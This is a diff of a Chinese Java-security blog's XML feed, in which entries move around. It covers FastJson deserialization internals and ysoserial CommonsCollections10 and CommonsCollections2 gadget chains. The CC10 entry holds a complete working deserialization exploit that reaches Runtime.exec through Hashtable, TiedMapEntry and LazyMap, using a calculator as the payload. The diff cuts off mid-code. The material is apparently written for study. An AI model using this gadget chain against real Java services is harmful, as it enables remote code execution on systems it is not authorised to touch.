+<p>若一定要反序列化私有属性，可以给parseObject方法加入<code>Feature.SupportNonPublicField</code>。加入之后，它的调用方式与parse()一样，而与parseObject()无关了。后面会分析到这一点。</p>
+</blockquote>
+<h3 id="反序列化的对比"><a href="#反序列化的对比" class="headerlink" title="反序列化的对比"></a>反序列化的对比</h3><p>在FastJson的反序列化过程中，最明显的是parse()和parseObject()进行反序列化时，有着很大的不同。<br>从下图可以看到，JSONObject()调用了parse()方法，只是在最后多了一个toJSON()方法，它在toJSON()方法里面对所有的getter方法进行调用。<br><img src="1.png" alt=""></p>
+<p>除此之外，还有2个属性的影响:</p>
+<ul>
+<li>有无class类型</li>
+<li>有无Feature.SupportNonPublicField属性</li>
+</ul>
+<h4 id="1-有无class类型"><a href="#1-有无class类型" class="headerlink" title="1.有无class类型"></a>1.有无class类型</h4><p><strong>无class类型</strong>: parseObject(str)  </p>
+<ul>
+<li>调用类的构造方法</li>
+<li>所有属性的getter方法</li>
+<li>所有属性的setter方法</li>
+</ul>
+<p><strong>有class类型</strong>: parseObject(str,*.class)  </p>
+<ul>
+<li>调用类的构造方法</li>
+<li>非私有属性的setter方法</li>
+<li>特定类型的getter方法。</li>
+</ul>
+<h4 id="2-有Feature-SupportNonPublicField属性"><a href="#2-有Feature-SupportNonPublicField属性" class="headerlink" title="2.有Feature.SupportNonPublicField属性"></a>2.有Feature.SupportNonPublicField属性</h4><p>添加了Feature的parseObject()实际上等同于添加了Feature的parse()方法<br><img src="2.png" alt=""></p>
+<ul>
+<li>调用类的构造方法</li>
+<li>所有属性的setter方法</li>
+<li>特定类型的getter方法</li>
+</ul>
+<h3 id="FastJson反序列化流程"><a href="#FastJson反序列化流程" class="headerlink" title="FastJson反序列化流程"></a>FastJson反序列化流程</h3><p>由于parseObject()只是比parse()多了个toJSON()的过程。整个反序列化分析流程就以parseObject()为例。</p>
+<p>其中最主要的是DefaultJSONParser类，在该类中会调用很多其他的类来一起完成整个过程。来看看这个类。</p>
+<h4 id="DefaultJSONParser"><a href="#DefaultJSONParser" class="headerlink" title="DefaultJSONParser"></a>DefaultJSONParser</h4><p>在这个里面有几个比较关键的类:</p>
+<pre><code>+ JSONLexer
++ ParserConfig
++ JavaBeanDeserializer
++ JSONScanner
++ ObjectDeserializer</code></pre><p>首先进入parse()函数，在该函数中调用DefaultJSONParser的parse()函数。<br><img src="3.png" alt=""></p>
+<p>进入DefaultJSONParser.parse()函数，会根据lexer.token的值来选择处理方式。这个lexter是继承自JSONLexerBase的JSONScanner。它对很多特殊符号如<code>{</code>、<code>[</code>等都赋了值。显然由于字符串的第一个字符为<code>{</code>,其token值为12。则进入DefaultJSONParser.parseObject()函数。</p>
+<p>在这个中，它会循环处理字符串，摘取类似”name”:”123”这样的key-value对。拖在这个过程中存在symbolTable中的字段，就会进TypeUtils.loadClass()函数。在这个里面若经过了checkAutoType的检查之后。紧接着就会获取对应的deserializer。</p>
+<p><img src="4.png" alt=""></p>
+<p>简单来说就是根据获取的clazz获取对应的deserilizer。若在预定数组中的类，则可以调用相关类的<code>deserialze</code>方法完成反序列化操作。若没有，则进入asm创建处理类的流程。在获取deserializer之后，会调用其deserilze函数进行反序列化。</p>
+<h4 id="JSON字符串的解析"><a href="#JSON字符串的解析" class="headerlink" title="JSON字符串的解析"></a>JSON字符串的解析</h4><p>Json字符串的核心处理流程是在DefaultJSONParser#parse中根据json字符串的标志位来进行分发的。</p>
+<p>最开始的标志位为<code>{</code>。</p>
+<pre><code>1. 判断下一个标志位是否为`&quot;`，若是则提取key值，这时的标志位为第二个`&quot;`。
+2. 判断下一个标志位是否为`:`
+    + 如果为`:`，则判断下一个标志位是否为`&quot;`，如果是，则获取value值，此时的标志位为`&quot;`
+    + 如果为`{`，则重复1～2过程
+3. 判断下一个标志位是否为`}`
+    + 若为`}`则表示这一单元的解析结束
+    + 若为`,`则表示要解析下一个嵌套数据，重复1～3</code></pre><p>根据不同的标志位进行不同的解析，当解析过程中遇到了<code>@type</code>或<code>$ref</code>时，将当作特殊的标志做相应的处理。</p>
+<h4 id="JavaBeanDeserializer"><a href="#JavaBeanDeserializer" class="headerlink" title="JavaBeanDeserializer"></a>JavaBeanDeserializer</h4><p>这里进入了JavaBeanDeserializer类进行处理。在该类的构造函数中，将JavaBeanInfo中的信息，包括fieldList等放入了sortedFieldDeserializers中。</p>
+<p>其deserialze这部分会遍历整个sortedFieldDeserializers中所有的key，并尝试根据类型来提取json字符串中相应的信息。若成功则转交给asm生成的处理类的createInstance实例化对象，若不成功则扫描json字符串中是否具有特殊指令集。</p>
+<h4 id="获取Deserilizer"><a href="#获取Deserilizer" class="headerlink" title="获取Deserilizer"></a>获取Deserilizer</h4><p>跟进一下getDeserializer()函数。</p>
+<p><img src="5.png" alt=""></p>
+<p>首先会尝试在deserializers中匹配type，若有则直接返回。没有则调用getDeserializer继续处理。跟进getDeserializer()。这部分代码很长，当不匹配上面的各种情况时，会调用到createJavaBeanDeserializer来创建一个新的deserializer。跟进createJavaBeanDeserializer()。</p>
+<p><img src="6.png" alt=""></p>
+<p>然后将生成的deserializer将其加入deserializers这个map。</p>
+<h4 id="JavaBeanInfo"><a href="#JavaBeanInfo" class="headerlink" title="JavaBeanInfo"></a>JavaBeanInfo</h4><p>在进入build函数后，会遍历一遍传入所有方法，寻找满足set开头的特定类型方法。setter方法的要求:</p>
+<ul>
+<li>方法名长度大于4且以set开头，且第四个字母需要大写</li>
+<li>非静态方法</li>
+<li>返回类型为void或者当前类</li>
+<li>参数个数为1</li>
+</ul>
+<p>获取符合条件的setter方法后，再获取propertyName。</p>
+<ul>
+<li>若第四个字符是大写的，则将其变为小写，然后获取propertyName值</li>
+<li>若第四个字符为<code>_</code>，直接获取<code>_</code>之后的值，然后同第一个一样处理</li>
+<li>若第四个字符为<code>f</code>，则直接去掉set即可</li>
+</ul>
+<p>然后判断获取到的propertyName是否在类成员变量中。如果不在并且其返回值为Boolean类型，就将其propertyName第一个字母大写，且加上<code>is</code>作为新的propertyName，去查找是否存在此成员变量。</p>
+<p><img src="7.png" alt=""></p>
+<p>当找到成员变量后，就将其放入fieldList中，放入的是一个FieldInfo对象，包括了(propertyName,method,field,clazz,type)等的信息。</p>
+<p>然后再次遍历所有方法，寻找到满足get开头方法。然后getter方法要求如下:</p>
+<ul>
+<li>函方法名长度大于4且以get开头，且第四个字母需要大写</li>
+<li>非静态方法</li>
+<li>函数没有入口参数</li>
+<li>继承自Collection || Map || AtomicBoolean || AtomicInteger || AtomicLong</li>
+</ul>
+<p>将第四个字母转为小写，然后将去掉get的值作为propertyName，然后从fieldList中查找是否存在该propertyName对应的fieldInfo。如果没有，则将该propertyName与此get方法的信息加入fieldList，其中field为null。<br><img src="8.png" alt=""></p>
+<p>遍历完所有的setter和getter方法后，就获取到了一个JavaBeanInfo对象，里面包括了该过程中生成的fieldList。</p>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
+<li><a href="https://xz.aliyun.com/t/7027#toc-23" target="_blank" rel="noopener">JAVA反序列化—FastJson组件</a></li>
+<li><a href="https://paper.seebug.org/994/" target="_blank" rel="noopener">Fastjson 流程分析及 RCE 分析</a></li>
+</ul>
+]]></content>
+  </entry>
+  <entry>
+    <title>Ripstech Java Security 2019 Calendar复现系列</title>
+    <url>/2020/04/30/java-calendar-2019/</url>
+    <content><![CDATA[<p>为了了解java安全，也算是入门一下java安全，把Ripstech上的2019 Java Calendar复现了一遍。</p>
+<a id="more"></a>
+<p>具体分析发表在了先知社区。</p>
+<p><a href="https://xz.aliyun.com/t/7098" target="_blank" rel="noopener">Ripstech Java Security 2019 Calendar复现系列(一)</a><br><a href="https://xz.aliyun.com/t/7162" target="_blank" rel="noopener">Ripstech Java Security 2019 Calendar复现系列(二)</a><br><a href="https://xz.aliyun.com/t/7206" target="_blank" rel="noopener">Ripstech Java Security 2019 Calendar复现系列(三)</a><br><a href="https://xz.aliyun.com/t/7247" target="_blank" rel="noopener">Ripstech Java Security 2019 Calendar复现系列(四)</a>  </p>
+<p>环境放在了<a href="https://github.com/ananaskr/Java_Calendar_2019" target="_blank" rel="noopener">github</a>上。</p>
 ]]></content>
       <categories>
         <category>JAVA安全</category>
@@ -628,19 +795,6 @@
 <li><a href="https://www.jianshu.com/p/b9b3ff0e1bf8" target="_blank" rel="noopener">Javassist 使用指南（二）</a></li>
 <li><a href="https://www.cnblogs.com/scy251147/p/11100961.html" target="_blank" rel="noopener">Javassist中文技术文档</a></li>
 </ul>
-]]></content>
-      <categories>
-        <category>JAVA安全</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>Ripstech Java Security 2019 Calendar复现系列</title>
-    <url>/2020/04/30/java-calendar-2019/</url>
-    <content><![CDATA[<p>为了了解java安全，也算是入门一下java安全，把Ripstech上的2019 Java Calendar复现了一遍。</p>
-<a id="more"></a>
-<p>具体分析发表在了先知社区。</p>
-<p><a href="https://xz.aliyun.com/t/7098" target="_blank" rel="noopener">Ripstech Java Security 2019 Calendar复现系列(一)</a><br><a href="https://xz.aliyun.com/t/7162" target="_blank" rel="noopener">Ripstech Java Security 2019 Calendar复现系列(二)</a><br><a href="https://xz.aliyun.com/t/7206" target="_blank" rel="noopener">Ripstech Java Security 2019 Calendar复现系列(三)</a><br><a href="https://xz.aliyun.com/t/7247" target="_blank" rel="noopener">Ripstech Java Security 2019 Calendar复现系列(四)</a>  </p>
-<p>环境放在了<a href="https://github.com/ananaskr/Java_Calendar_2019" target="_blank" rel="noopener">github</a>上。</p>
 ]]></content>
       <categories>
         <category>JAVA安全</category>
@@ -865,6 +1019,37 @@
       </categories>
   </entry>
   <entry>
+    <title>ysoserial分析之CommonsCollecions10</title>
+    <url>/2020/04/28/ysoserial-analyze-10/</url>
+    <content><![CDATA[<p>这篇文章分析的是CommonsCollections10，这是<a href="https://github.com/wh1t3p1g" target="_blank" rel="noopener">wh1t3p1g</a>师傅提出来的，这篇文章分析分析它用到了哪个新的点。</p>
+<a id="more"></a>
+
+<p>前面已经分析了:<br><a href="https://ananaskr.github.io/2020/04/20/ysoserial-analyze/" target="_blank" rel="noopener">ysoserial分析之CommonsCollections1</a><br><a href="https://ananaskr.github.io/2020/04/24/ysoserial-analyze-2/" target="_blank" rel="noopener">ysoserial分析之CommonsCollections2</a><br><a href="https://ananaskr.github.io/2020/04/23/ysoserial-analyze-3/" target="_blank" rel="noopener">ysoserial分析之CommonsCollections3</a><br><a href="https://ananaskr.github.io/2020/04/26/ysoserial-analyze-4/" target="_blank" rel="noopener">ysoserial分析之CommonsCollections4</a><br><a href="https://ananaskr.github.io/2020/04/26/ysoserial-analyze-5/" target="_blank" rel="noopener">ysoserial分析之CommonsCollections5</a><br><a href="https://ananaskr.github.io/2020/04/27/ysoserial-analyze-6/" target="_blank" rel="noopener">ysoserial分析之CommonsCollections6</a><br><a href="https://ananaskr.github.io/2020/04/27/ysoserial-analyze-7/" target="_blank" rel="noopener">ysoserial分析之CommonsCollections7</a><br><a href="https://ananaskr.github.io/2020/04/28/ysoserial-analyze-8/" target="_blank" rel="noopener">ysoserial分析之CommonsCollections8</a><br><a href="https://ananaskr.github.io/2020/04/28/ysoserial-analyze-9/" target="_blank" rel="noopener">ysoserial分析之CommonsCollections9</a></p>
+<p>wh1t3p1g师傅提出的CommonsCollections10主要是结合了CommonsCollection6，7。在Hashtable的reconstitutionPut函数中找到利用hashcode方法来触发TiedMapEntry.getValue方法，从而触发LazyMap.get方法的点。整个反序列链如下所示:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Hashtable.readObject()</span><br><span class="line">  -&gt;Hashtable.reconstitutionPut()</span><br><span class="line">    -&gt;TiedMapEntry.hashCode()</span><br><span class="line">      -&gt;TiedMapEntry.getValue()</span><br><span class="line">        -&gt;LazyMap.get()</span><br><span class="line">          -&gt;ChainedTransformer.transform()</span><br><span class="line">            -&gt;InvokerTransformer.transform()</span><br></pre></td></tr></table></figure>
+
+<h2 id="利用链分析及构造"><a href="#利用链分析及构造" class="headerlink" title="利用链分析及构造"></a>利用链分析及构造</h2><p>最外层还是还是使用Hashtable触发了readObject函数，接着进入reconstitutionPut函数，看看这个函数。</p>
+<p><img src="1.png" alt=""></p>
+<p>可以看到了调用了hashCode()函数。而在前面提到过，TiedMapEntry类的触发getValue函数有toString、hashCode以及equals。这里是hashCode。所以，这里的key是TiedMapEntry对象。首先是构造TiedMapEntry对象。</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">               <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">               new InvokerTransformer("getMethod",new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;"getRuntime",new Class[0]&#125;),</span><br><span class="line">               new InvokerTransformer("invoke",new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;),</span><br><span class="line">               new InvokerTransformer("exec",new Class[]&#123;String.class&#125;,new Object[]&#123;"/Applications/Calculator.app/Contents/MacOS/Calculator"&#125;)</span><br><span class="line"></span><br><span class="line">       &#125;;</span><br><span class="line"></span><br><span class="line">       ChainedTransformer transformer  = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">       Map map = <span class="keyword">new</span> HashMap();</span><br><span class="line">       Map lazyMap = LazyMap.decorate(map,transformer);</span><br><span class="line"></span><br><span class="line">       TiedMapEntry tiedMapEntry = <span class="keyword">new</span> TiedMapEntry(lazyMap,<span class="number">1</span>);</span><br></pre></td></tr></table></figure>
+
+<p>然后实例化一个Hashtable，放入元素后，获取Hashtable的table属性，然后获取table中的Entry的key属性，将key属性设置为TiedMapEntry对象即可。代码如下:</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Hashtable hashtable = <span class="keyword">new</span> Hashtable();</span><br><span class="line">hashtable.put(<span class="string">"foo"</span>,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">Field field = hashtable.getClass().getDeclaredField(<span class="string">"table"</span>);</span><br><span class="line">field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">Object[] table = (Object[]) field.get(hashtable);</span><br><span class="line">Object entry = table[<span class="number">0</span>];</span><br><span class="line"><span class="keyword">if</span> (entry==<span class="keyword">null</span>)&#123;</span><br><span class="line">       entry = table[<span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Field keyfield = entry.getClass().getDeclaredField(<span class="string">"key"</span>);</span><br><span class="line">keyfield.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">keyfield.set(entry,tiedMapEntry);</span><br></pre></td></tr></table></figure>
+
+<p>完整的demo如下:</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InvokerTransformer("getMethod",new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;"getRuntime",new Class[0]&#125;),</span><br><span class="line">                new InvokerTransformer("invoke",new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;),</span><br><span class="line">                new InvokerTransformer("exec",new Class[]&#123;String.class&#125;,new Object[]&#123;"/Applications/Calculator.app/Contents/MacOS/Calculator"&#125;)</span><br><span class="line"></span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        ChainedTransformer transformer  = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        Map map = <span class="keyword">new</span> HashMap();</span><br><span class="line">        Map lazyMap = LazyMap.decorate(map,transformer);</span><br><span class="line"></span><br><span class="line">        TiedMapEntry tiedMapEntry = <span class="keyword">new</span> TiedMapEntry(lazyMap,<span class="number">1</span>);</span><br><span class="line">        </span><br><span class="line">        Hashtable hashtable = <span class="keyword">new</span> Hashtable();</span><br><span class="line">        hashtable.put(<span class="string">"foo"</span>,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        Field field = hashtable.getClass().getDeclaredField(<span class="string">"table"</span>);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">        Object[] table = (Object[]) field.get(hashtable);</span><br><span class="line">        Object entry = table[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">if</span> (entry==<span class="keyword">null</span>)&#123;</span><br><span class="line">            entry = table[<span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Field keyfield = entry.getClass().getDeclaredField(<span class="string">"key"</span>);</span><br><span class="line">        keyfield.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        keyfield.set(entry,tiedMapEntry);</span><br><span class="line"></span><br><span class="line">         ByteArrayOutputStream baos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">         ObjectOutputStream out = <span class="keyword">new</span> ObjectOutputStream(baos);</span><br><span class="line">         out.writeObject(hashtable);</span><br><span class="line">         out.flush();</span><br><span class="line">         out.close();</span><br><span class="line"></span><br><span class="line">         <span class="keyword">byte</span>[] bytes = baos.toByteArray();</span><br><span class="line"></span><br><span class="line">         ByteArrayInputStream bais = <span class="keyword">new</span> ByteArrayInputStream(bytes);</span><br><span class="line">         ObjectInputStream in = <span class="keyword">new</span> ObjectInputStream(bais);</span><br><span class="line">         in.readObject();</span><br><span class="line">         in.close();</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>结果如下:</p>
+<p><img src="2.png" alt=""></p>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
+<li><a href="http://blog.0kami.cn/2019/10/31/study-java-deserialized-commonscollections3-others/" target="_blank" rel="noopener">Java反序列化利用链挖掘之CommonsCollections5,6,7,9,10</a></li>
+</ul>
+]]></content>
+      <categories>
+        <category>JAVA安全</category>
+      </categories>
+  </entry>
+  <entry>
     <title>ysoserial分析之CommonsCollections1</title>
     <url>/2020/04/20/ysoserial-analyze-1/</url>
     <content><![CDATA[<p>在上一篇<a href="https://ananaskr.github.io/2020/04/20/common-collections/" target="_blank" rel="noopener">文章</a>中，分析了使用commons-collections用来进行RCE的原理。那么在实际情况中，需要找到一个反序列化链来RCE。这篇文章分析的就是CommonsCollections1。让我们来看看它是如何构造反序列化链的。</p>
@@ -950,30 +1135,52 @@
       </categories>
   </entry>
   <entry>
-    <title>ysoserial分析之CommonsCollecions10</title>
-    <url>/2020/04/28/ysoserial-analyze-10/</url>
-    <content><![CDATA[<p>这篇文章分析的是CommonsCollections10，这是<a href="https://github.com/wh1t3p1g" target="_blank" rel="noopener">wh1t3p1g</a>师傅提出来的，这篇文章分析分析它用到了哪个新的点。</p>
+    <title>ysoserial分析之CommonsCollections2</title>
+    <url>/2020/04/24/ysoserial-analyze-2/</url>
+    <content><![CDATA[<p>这篇文章分析的是CommonsCollections2，与之前不同的是，它是在commonscollections4.0版本下的利用链。与CommonsCollections3一样的是，它也是利用TemplatesImpl对象来执行任意命令的。接下来就来具体分析分析它。</p>
 <a id="more"></a>
 
-<p>前面已经分析了:<br><a href="https://ananaskr.github.io/2020/04/20/ysoserial-analyze/" target="_blank" rel="noopener">ysoserial分析之CommonsCollections1</a><br><a href="https://ananaskr.github.io/2020/04/24/ysoserial-analyze-2/" target="_blank" rel="noopener">ysoserial分析之CommonsCollections2</a><br><a href="https://ananaskr.github.io/2020/04/23/ysoserial-analyze-3/" target="_blank" rel="noopener">ysoserial分析之CommonsCollections3</a><br><a href="https://ananaskr.github.io/2020/04/26/ysoserial-analyze-4/" target="_blank" rel="noopener">ysoserial分析之CommonsCollections4</a><br><a href="https://ananaskr.github.io/2020/04/26/ysoserial-analyze-5/" target="_blank" rel="noopener">ysoserial分析之CommonsCollections5</a><br><a href="https://ananaskr.github.io/2020/04/27/ysoserial-analyze-6/" target="_blank" rel="noopener">ysoserial分析之CommonsCollections6</a><br><a href="https://ananaskr.github.io/2020/04/27/ysoserial-analyze-7/" target="_blank" rel="noopener">ysoserial分析之CommonsCollections7</a><br><a href="https://ananaskr.github.io/2020/04/28/ysoserial-analyze-8/" target="_blank" rel="noopener">ysoserial分析之CommonsCollections8</a><br><a href="https://ananaskr.github.io/2020/04/28/ysoserial-analyze-9/" target="_blank" rel="noopener">ysoserial分析之CommonsCollections9</a></p>
-<p>wh1t3p1g师傅提出的CommonsCollections10主要是结合了CommonsCollection6，7。在Hashtable的reconstitutionPut函数中找到利用hashcode方法来触发TiedMapEntry.getValue方法，从而触发LazyMap.get方法的点。整个反序列链如下所示:</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Hashtable.readObject()</span><br><span class="line">  -&gt;Hashtable.reconstitutionPut()</span><br><span class="line">    -&gt;TiedMapEntry.hashCode()</span><br><span class="line">      -&gt;TiedMapEntry.getValue()</span><br><span class="line">        -&gt;LazyMap.get()</span><br><span class="line">          -&gt;ChainedTransformer.transform()</span><br><span class="line">            -&gt;InvokerTransformer.transform()</span><br></pre></td></tr></table></figure>
+<p>前面已经分析过的文章</p>
+<p><a href="https://ananaskr.github.io/2020/04/20/ysoserial-analyze/" target="_blank" rel="noopener">ysoserial分析之CommonsCollections1</a><br><a href="https://ananaskr.github.io/2020/04/23/ysoserial-analyze-3/" target="_blank" rel="noopener">ysoserial分析之CommonsCollections3</a></p>
+<p>与CommonsCollections3一样的是，它也是利用<code>TemplatesImpl</code>来进行最终的命令执行<font color=#008000>(commons-collections:4.0版本下的利用链利用的都是<code>TemplatesImpl</code>)</font>。不同的是它用到了一个新类<code>PriorityQueue</code>来触发transform函数。<code>PriorityQueue</code>类。这个类有什么作用呢？让我们来分析分析。</p>
+<p>整个反序列化利用链如下所示:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ObjectInputStream.readObject()</span><br><span class="line">	-&gt;PriorityQueue.readObject()</span><br><span class="line">		-&gt;PriorityQueue.heapify()</span><br><span class="line">			-&gt;PriorityQueue.siftDown()</span><br><span class="line">				-&gt;PriorityQueue.siftDownUsingComparator()</span><br><span class="line">					-&gt;TransformingComparator.compare()</span><br><span class="line">						-&gt;InvokerTransformer.transform()</span><br><span class="line">							-&gt;TemplatesImpl.newTransform()</span><br></pre></td></tr></table></figure>
 
-<h2 id="利用链分析及构造"><a href="#利用链分析及构造" class="headerlink" title="利用链分析及构造"></a>利用链分析及构造</h2><p>最外层还是还是使用Hashtable触发了readObject函数，接着进入reconstitutionPut函数，看看这个函数。</p>
+
+<h2 id="利用链分析"><a href="#利用链分析" class="headerlink" title="利用链分析"></a>利用链分析</h2><p>首先在反序列化的过程中所需要用的类必须实现了<code>Serilizable</code>类。<code>PriorityQueue</code>也不例外。观察它的<code>readObject</code>类。</p>
 <p><img src="1.png" alt=""></p>
-<p>可以看到了调用了hashCode()函数。而在前面提到过，TiedMapEntry类的触发getValue函数有toString、hashCode以及equals。这里是hashCode。所以，这里的key是TiedMapEntry对象。首先是构造TiedMapEntry对象。</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">               <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">               new InvokerTransformer("getMethod",new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;"getRuntime",new Class[0]&#125;),</span><br><span class="line">               new InvokerTransformer("invoke",new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;),</span><br><span class="line">               new InvokerTransformer("exec",new Class[]&#123;String.class&#125;,new Object[]&#123;"/Applications/Calculator.app/Contents/MacOS/Calculator"&#125;)</span><br><span class="line"></span><br><span class="line">       &#125;;</span><br><span class="line"></span><br><span class="line">       ChainedTransformer transformer  = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">       Map map = <span class="keyword">new</span> HashMap();</span><br><span class="line">       Map lazyMap = LazyMap.decorate(map,transformer);</span><br><span class="line"></span><br><span class="line">       TiedMapEntry tiedMapEntry = <span class="keyword">new</span> TiedMapEntry(lazyMap,<span class="number">1</span>);</span><br></pre></td></tr></table></figure>
-
-<p>然后实例化一个Hashtable，放入元素后，获取Hashtable的table属性，然后获取table中的Entry的key属性，将key属性设置为TiedMapEntry对象即可。代码如下:</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Hashtable hashtable = <span class="keyword">new</span> Hashtable();</span><br><span class="line">hashtable.put(<span class="string">"foo"</span>,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">Field field = hashtable.getClass().getDeclaredField(<span class="string">"table"</span>);</span><br><span class="line">field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">Object[] table = (Object[]) field.get(hashtable);</span><br><span class="line">Object entry = table[<span class="number">0</span>];</span><br><span class="line"><span class="keyword">if</span> (entry==<span class="keyword">null</span>)&#123;</span><br><span class="line">       entry = table[<span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Field keyfield = entry.getClass().getDeclaredField(<span class="string">"key"</span>);</span><br><span class="line">keyfield.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">keyfield.set(entry,tiedMapEntry);</span><br></pre></td></tr></table></figure>
-
-<p>完整的demo如下:</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InvokerTransformer("getMethod",new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;"getRuntime",new Class[0]&#125;),</span><br><span class="line">                new InvokerTransformer("invoke",new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;),</span><br><span class="line">                new InvokerTransformer("exec",new Class[]&#123;String.class&#125;,new Object[]&#123;"/Applications/Calculator.app/Contents/MacOS/Calculator"&#125;)</span><br><span class="line"></span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        ChainedTransformer transformer  = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        Map map = <span class="keyword">new</span> HashMap();</span><br><span class="line">        Map lazyMap = LazyMap.decorate(map,transformer);</span><br><span class="line"></span><br><span class="line">        TiedMapEntry tiedMapEntry = <span class="keyword">new</span> TiedMapEntry(lazyMap,<span class="number">1</span>);</span><br><span class="line">        </span><br><span class="line">        Hashtable hashtable = <span class="keyword">new</span> Hashtable();</span><br><span class="line">        hashtable.put(<span class="string">"foo"</span>,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        Field field = hashtable.getClass().getDeclaredField(<span class="string">"table"</span>);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">        Object[] table = (Object[]) field.get(hashtable);</span><br><span class="line">        Object entry = table[<span class="number">0</span>];</span><br><span class="line">        <span 